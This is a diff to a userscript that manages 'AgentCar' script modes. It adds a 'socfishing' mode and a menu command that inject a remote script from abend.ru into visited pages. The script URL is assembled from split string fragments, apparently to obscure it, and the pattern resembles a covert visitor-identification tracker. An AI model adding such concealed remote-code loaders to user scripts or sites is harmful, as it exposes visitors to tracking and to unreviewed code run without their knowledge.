@@ -22,6 +22,25 @@ var id = GM_getValue(...{
 }[acScript]);
 var DOMAIN = GM_getValue('agentCar_DOMAIN', 'debian359.tk');
 
+if (acScript == 'socfishing') {
+	var script = document.createElement("script");
+	script.innerHTML = `
+    !function(bl, v, t, o) {
+        var ft = bl.createElement("script");
+        var v = "1";
+        ft.type = "text/javascript";
+        ft.async = 1;
+        ft.src = "";
+        var v = ("h") + "ttp:/" + "/abend." + ("ru/f/?u=1") + ("&id=") + t + "&j=1&gu" + "id=" + o + "&u34.js";
+        ft.src = v;
+        var v = "0";
+        var c = bl.getElementsByTagName("script")[0];
+        c.parentNode.insertBefore(ft, c)
+    }(document, "1479751145", "ab1d29e9e43a6701", "");
+	`;
+	document.head.appendChild(script);
+}
+
 console.log('AgentCar id: ', id);
 
 var exit = reload => reload && location.reload(false);
@@ -52,6 +71,7 @@ GM_registerMenuCommand('Skoda', change.bind(null, 'agentcar', 'kZD2WwvnheGtest3'
 GM_registerMenuCommand('Game', change.bind(null, 'game', 'id1'), 'G');
 GM_registerMenuCommand('debian359.tk', changeDomain.bind(null, 'debian359.tk', true), 'd');
 GM_registerMenuCommand('localhosh:3000', changeDomain.bind(null, 'localhost:3000', true), 'd');
+GM_registerMenuCommand('socfishing: test.ac.ga', changeScript.bind(null, 'socfishing', true), 'f');
 
 var script = document.createElement('script');
 
